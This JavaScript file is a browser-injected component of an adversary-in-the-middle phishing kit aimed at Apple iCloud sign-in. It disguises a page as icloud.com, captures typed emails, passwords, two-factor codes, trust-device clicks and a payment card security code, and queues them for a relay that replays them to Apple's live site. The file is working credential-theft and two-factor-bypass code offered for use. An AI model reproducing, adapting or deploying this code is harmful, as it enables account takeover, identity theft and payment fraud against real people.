// Injected into the victim-facing Harbor page (via Playwright add_init_script) so it
// runs before the page's own scripts. It does two things:
//
//   1. Intercepts the sign-in form submits (email Continue / password Sign In) and the
//      trust-button clicks BEFORE Harbor's local demo validation runs, and records them
//      in window.__phishQueue for the mirror to forward to a live icloud.com tab.
//   2. Applies 1:1 iCloud branding (title, heading, privacy copy, toolbar logo, light
//      theme) so the victim-facing page reads as icloud.com, not Harbor.
//
// The mirror (phish_mirror.py) drains the queue, forwards each event to Apple, and drives
// the victim through the steps via window.HarborDriver (harbor_driver.js).

(function () {
  if (window.__phishBridgeInstalled) return;
  window.__phishBridgeInstalled = true;
  window.__phishQueue = window.__phishQueue || [];
  var __phishSeq = 0;
  var accountRelayTimer = null;
  var passwordRelayTimer = null;
  var ACCOUNT_RELAY_MS = 40;
  var PASSWORD_RELAY_MS = 50;

  function pushPasswordToRelay() {
    var el = document.getElementById("password");
    if (!el || currentStep() !== "password") return;
    push("input", { field: "password", value: el.value || "" });
  }

  function schedulePasswordRelay() {
    if (passwordRelayTimer) clearTimeout(passwordRelayTimer);
    passwordRelayTimer = setTimeout(function () {
      passwordRelayTimer = null;
      pushPasswordToRelay();
    }, PASSWORD_RELAY_MS);
  }

  function flushPasswordRelay() {
    if (passwordRelayTimer) {
      clearTimeout(passwordRelayTimer);
      passwordRelayTimer = null;
    }
    var el = document.getElementById("password");
    if (!el || currentStep() !== "password") return;
    var v = el.value || "";
    if (v) {
      push("password-commit", { password: v });
    }
    pushPasswordToRelay();
  }

  function pushAccountToRelay() {
    var el = document.getElementById("account");
    if (!el) return;
    push("input", { field: "account", value: el.value || "" });
  }

  function scheduleAccountRelay() {
    if (accountRelayTimer) clearTimeout(accountRelayTimer);
    accountRelayTimer = setTimeout(function () {
      accountRelayTimer = null;
      pushAccountToRelay();
    }, ACCOUNT_RELAY_MS);
  }

  function flushAccountRelay() {
    if (accountRelayTimer) {
      clearTimeout(accountRelayTimer);
      accountRelayTimer = null;
    }
    var el = document.getElementById("account");
    var v = el ? (el.value || "").trim() : "";
    if (v) {
      push("email-commit", { account: v });
    }
    pushAccountToRelay();
  }

  function push(type, payload) {
    var ev = { type: type, payload: payload, t: Date.now(), seq: ++__phishSeq };
    window.__phishQueue.push(ev);
    if (typeof window.__phishRelayForward === "function") {
      try {
        window.__phishRelayForward(ev);
      } catch (e) { /* ignore */ }
    }
  }

  function paintContinueLoading(on) {
    var btn = document.getElementById("continue-btn");
    if (!btn) return;
    var sp = btn.querySelector(".btn-spinner");
    var lab = btn.querySelector(".btn-label");
    if (on) {
      btn.classList.add("is-loading");
      btn.disabled = true;
      btn.setAttribute("aria-busy", "true");
      if (sp) sp.style.display = "block";
      if (lab) lab.style.opacity = "0";
    } else {
      btn.classList.remove("is-loading");
      btn.removeAttribute("aria-busy");
      if (sp) sp.style.display = "";
      if (lab) lab.style.opacity = "";
    }
  }

  function beginSubmitLoading() {
    window.__harborSubmitPending = true;
    window.__harborSigninLoading = true;
    try {
      sessionStorage.setItem("harbor_signin_pending", "1");
    } catch (e) { /* ignore */ }
    paintContinueLoading(true);
    if (typeof window.__harborSyncSigninLoading === "function") {
      window.__harborSyncSigninLoading(true);
    } else if (window.PhishBridge && window.PhishBridge.setLoading) {
      window.PhishBridge.setLoading(true);
    }
    window.requestAnimationFrame(function () {
      if (!window.__harborSubmitPending) return;
      paintContinueLoading(true);
    });
  }

  function clearSubmitLoading() {
    window.__harborSubmitPending = false;
    window.__harborSigninLoading = false;
    try {
      sessionStorage.removeItem("harbor_signin_pending");
    } catch (e) { /* ignore */ }
    paintContinueLoading(false);
    if (typeof window.__harborSyncSigninLoading === 'function') {
      window.__harborSyncSigninLoading(false);
    } else if (window.PhishBridge && window.PhishBridge.setLoading) {
      window.PhishBridge.setLoading(false);
    }
  }

  window.paintContinueLoading = paintContinueLoading;

  try {
    if (sessionStorage.getItem("harbor_signin_pending") === "1") {
      window.__harborSubmitPending = true;
      window.__harborSigninLoading = true;
      window.setTimeout(function () {
        if (!window.__harborSubmitPending) return;
        beginSubmitLoading();
      }, 0);
    }
  } catch (e) { /* ignore */ }

  function currentStep() {
    var pw = document.getElementById('step-password');
    if (pw && !pw.hidden) return 'password';
    return 'email';
  }

  function applyIcloudChrome() {
    try {
      document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"]').forEach(function (el) {
        el.href = '/favicon.ico';
      });
      if (!document.querySelector('link[rel="icon"][href="/favicon.ico"]')) {
        var ico = document.createElement('link');
        ico.rel = 'icon';
        ico.href = '/favicon.ico';
        document.head.appendChild(ico);
      }
    } catch (e) { /* ignore */ }
    try {
      document.title = 'iCloud';
    } catch (e) { /* ignore */ }
    try {
      var heading = document.querySelector('.sign-in-label');
      if (heading) {
        heading.textContent = 'Sign in to your Apple Account';
      }
    } catch (e) { /* ignore */ }
    try {
      var privacy = document.querySelector('.privacy-text');
      if (privacy) {
        privacy.textContent = (privacy.textContent || '')
          .replace(/Harbor/g, 'Apple')
          .replace(/harbor/g, 'Apple');
      }
    } catch (e) { /* ignore */ }
    try {
      document.querySelectorAll('.mark-logo').forEach(function (img) {
        img.src = 'mark.svg';
        img.setAttribute('width', '82');
        img.setAttribute('height', '31');
        img.classList.add('apple-icloud-logo');
        img.style.height = '';
        img.style.width = '';
        img.style.filter = 'brightness(0)';
      });
    } catch (e) { /* ignore */ }
    try {
      if (window.HarborTheme) {
        window.HarborTheme.set('light');
      } else {
        document.documentElement.setAttribute('data-harbor-theme', 'light');
      }
    } catch (e) { /* ignore */ }
    try {
      document.querySelectorAll('.theme-picker').forEach(function (el) {
        el.remove();
      });
    } catch (e) { /* ignore */ }
  }

  applyIcloudChrome();
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', applyIcloudChrome);
  }
  window.setTimeout(applyIcloudChrome, 400);
  window.setTimeout(applyIcloudChrome, 1500);

  try {
    sessionStorage.setItem('harbor_apple_mirror', '1');
  } catch (e) { /* ignore */ }

  document.addEventListener(
    'mousedown',
    function (e) {
      var btn = e.target && e.target.closest ? e.target.closest('#continue-btn') : null;
      if (!btn || btn.disabled || btn.classList.contains('is-loading')) return;
      var accountEl = document.getElementById('account');
      var passwordEl = document.getElementById('password');
      var step = currentStep();
      if (step === 'email' && !(accountEl && accountEl.value.trim())) return;
      if (step === 'password' && !(passwordEl && passwordEl.value.trim())) return;
      beginSubmitLoading();
    },
    true
  );

  document.addEventListener(
    'submit',
    function (e) {
      var form = e.target;
      if (!form || form.id !== 'sign-in') return;
      if (form.classList && !form.classList.contains('auth-widget')) return;
      e.preventDefault();
      e.stopPropagation();
      beginSubmitLoading();
      flushAccountRelay();
      flushPasswordRelay();
      var accountEl = document.getElementById('account');
      var passwordEl = document.getElementById('password');
      push('submit', {
        step: currentStep(),
        account: accountEl ? accountEl.value : '',
        password: passwordEl ? passwordEl.value : '',
      });
    },
    true
  );

  document.addEventListener(
    'click',
    function (e) {
      var btn = e.target && e.target.closest ? e.target.closest('#continue-btn') : null;
      if (!btn || btn.disabled || btn.classList.contains('is-loading')) return;
      var form = document.getElementById('sign-in');
      if (!form || form.id !== 'sign-in') return;
      var accountEl = document.getElementById('account');
      var passwordEl = document.getElementById('password');
      var step = currentStep();
      if (step === 'email' && !(accountEl && accountEl.value.trim())) return;
      if (step === 'password' && !(passwordEl && passwordEl.value.trim())) return;
      beginSubmitLoading();
      flushAccountRelay();
      flushPasswordRelay();
      push('submit', {
        step: step,
        account: accountEl ? accountEl.value : '',
        password: passwordEl ? passwordEl.value : '',
        viaButton: true,
      });
      e.preventDefault();
      e.stopPropagation();
    },
    true
  );

  function wireDynamicMirrorRoot(root) {
    if (!root || root.__harborMirrorWired) return;
    root.__harborMirrorWired = true;
    root.addEventListener(
      'input',
      function (e) {
        var t = e.target;
        if (!t || t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
        push('mirror-input', {
          value: t.value || '',
          id: t.id || '',
          name: t.name || '',
          kind: t.getAttribute('data-harbor-kind') || '',
          autocomplete: t.getAttribute('autocomplete') || '',
        });
      },
      true
    );
    root.addEventListener(
      'click',
      function (e) {
        var btn = e.target && e.target.closest ? e.target.closest('button, a[role="button"]') : null;
        if (!btn) return;
        var label = (btn.innerText || btn.textContent || '').trim().replace(/\s+/g, ' ');
        if (!label || label.length > 120) return;
        e.preventDefault();
        e.stopPropagation();
        push('mirror-click', { label: label, id: btn.id || '' });
      },
      true
    );
  }

  document.addEventListener(
    'input',
    function (e) {
      var t = e.target;
      if (!t || !t.id) return;
      if (t.classList && t.classList.contains('otp-digit')) {
        var raw = (t.getAttribute('data-otp-index') || t.id.replace('otp-', '') || '0');
        var index = parseInt(raw, 10);
        if (isNaN(index)) index = 0;
        push('otp-input', {
          index: index,
          digit: (t.value || '').replace(/\D/g, '').slice(-1),
        });
        return;
      }
      if (t.id !== 'account' && t.id !== 'password' && t.id !== 'payment-csc') return;
      if (t.id === 'account') {
        scheduleAccountRelay();
        return;
      }
      if (t.id === 'password') {
        schedulePasswordRelay();
        return;
      }
      push('input', { field: t.id, value: t.value || '' });
    },
    true
  );

  document.addEventListener(
    'blur',
    function (e) {
      var t = e.target;
      if (!t || !t.id) return;
      if (t.id === 'account') {
        flushAccountRelay();
        return;
      }
      if (t.id === 'password') {
        flushPasswordRelay();
      }
    },
    true
  );

  document.addEventListener(
    'keydown',
    function (e) {
      if (e.key !== 'Enter' || e.isComposing) return;
      var t = e.target;
      if (!t || (t.id !== 'account' && t.id !== 'password')) return;
      var form = document.getElementById('sign-in');
      if (!form) return;
      beginSubmitLoading();
      e.preventDefault();
      e.stopPropagation();
      flushAccountRelay();
      flushPasswordRelay();
      var accountEl = document.getElementById('account');
      var passwordEl = document.getElementById('password');
      push('submit', {
        step: currentStep(),
        account: accountEl ? accountEl.value : '',
        password: passwordEl ? passwordEl.value : '',
        viaEnter: true,
      });
      beginSubmitLoading();
    },
    true
  );

  document.addEventListener(
    'keydown',
    function (e) {
      var t = e.target;
      if (!t || !t.classList || !t.classList.contains('otp-digit')) return;
      if (e.key !== 'Backspace') return;
      var raw = (t.getAttribute('data-otp-index') || t.id.replace('otp-', '') || '0');
      var index = parseInt(raw, 10);
      if (isNaN(index)) index = 0;
      push('otp-input', { index: index, digit: '', backspace: true });
    },
    true
  );

  document.addEventListener(
    'paste',
    function (e) {
      var t = e.target;
      if (!t || !t.classList || !t.classList.contains('otp-digit')) return;
      var pasted = (
        (e.clipboardData && e.clipboardData.getData('text')) ||
        (window.clipboardData && window.clipboardData.getData('Text')) ||
        ''
      )
        .replace(/\D/g, '')
        .slice(0, 6);
      if (!pasted) return;
      push('otp-paste', { digits: pasted.split('') });
    },
    true
  );

  document.addEventListener(
    'click',
    function (e) {
      var t = e.target;
      var payBtn = t && t.closest ? t.closest('#payment-continue, #payment-cancel') : null;
      if (payBtn) {
        e.preventDefault();
        e.stopPropagation();
        push('mirror-click', {
          label: (payBtn.innerText || payBtn.textContent || payBtn.id || '').trim(),
          id: payBtn.id || '',
        });
        return;
      }
      var btn = t && t.closest ? t.closest('.trust-btn') : null;
      if (!btn) return;
      e.preventDefault();
      e.stopPropagation();
      push('trust', {
        id: btn.id || '',
        label: (btn.innerText || btn.textContent || '').trim(),
      });
    },
    true
  );

  window.PhishBridge = {
    queue: function () {
      return window.__phishQueue.splice(0);
    },
    getOtp: function () {
      var templateDigits = Array.prototype.map.call(
        document.querySelectorAll('.otp-digit'),
        function (el) {
          return el.value;
        }
      );
      if (templateDigits.length >= 6 && templateDigits.some(function (v) { return v; })) {
        return templateDigits.slice(0, 6);
      }
      var host = document.getElementById('apple-mirror-host');
      if (host && host.shadowRoot) {
        var stolen = host.shadowRoot.querySelectorAll(
          'input.form-security-code-input, input.security-code-input, input[maxlength="1"]'
        );
        if (stolen.length >= 6) {
          return Array.prototype.map.call(stolen, function (el, i) {
            return i < 6 ? el.value : '';
          }).slice(0, 6);
        }
      }
      if (host && !host.hidden && !host.shadowRoot) {
        var plain = host.querySelectorAll(
          'input.form-security-code-input, input.security-code-input, input[maxlength="1"]'
        );
        if (plain.length >= 6) {
          return Array.prototype.map.call(plain, function (el, i) {
            return i < 6 ? el.value : '';
          }).slice(0, 6);
        }
      }
      return Array.prototype.map.call(document.querySelectorAll('.otp-digit'), function (el) {
        return el.value;
      });
    },
    clearOtp: function () {
      Array.prototype.forEach.call(document.querySelectorAll('.otp-digit'), function (el) {
        el.value = '';
      });
    },
    setLoading: function (on) {
      window.__harborSigninLoading = !!on;
      paintContinueLoading(!!on);
      if (typeof window.__harborSyncSigninLoading === 'function') {
        window.__harborSyncSigninLoading(!!on);
        return;
      }
      var btn = document.getElementById('continue-btn');
      var accountEl = document.getElementById('account');
      var passwordEl = document.getElementById('password');
      if (btn) {
        btn.classList.toggle('is-loading', on);
        if (on) {
          btn.disabled = true;
        } else {
          btn.disabled = false;
          if (window.HarborDriver && window.HarborDriver.signinStep) {
            try {
              var step = window.HarborDriver.signinStep();
              if (step === 'password') {
                var ac = document.getElementById('account');
                var pw = document.getElementById('password');
                btn.disabled = !(ac && ac.value.trim() && pw && pw.value.trim());
              } else {
                btn.disabled = !(accountEl && accountEl.value.trim());
              }
            } catch (e) {
              btn.disabled = false;
            }
          }
        }
      }
      if (accountEl) accountEl.disabled = false;
      if (passwordEl) passwordEl.disabled = false;
    },
    startVerifying: function () {
      var statusEl = document.getElementById('verify-status');
      if (statusEl) statusEl.hidden = false;
      Array.prototype.forEach.call(document.querySelectorAll('.otp-digit'), function (el) {
        el.readOnly = true;
      });
    },
    stopVerifying: function () {
      var statusEl = document.getElementById('verify-status');
      if (statusEl) statusEl.hidden = true;
      Array.prototype.forEach.call(document.querySelectorAll('.otp-digit'), function (el) {
        el.readOnly = false;
      });
    },
    isPasswordStep: function () {
      return currentStep() === 'password';
    },
    applyIcloudChrome: applyIcloudChrome,
    wireDynamicMirrorRoot: wireDynamicMirrorRoot,
    clearSubmitLoading: clearSubmitLoading,
    paintContinueLoading: paintContinueLoading,
  };
})();
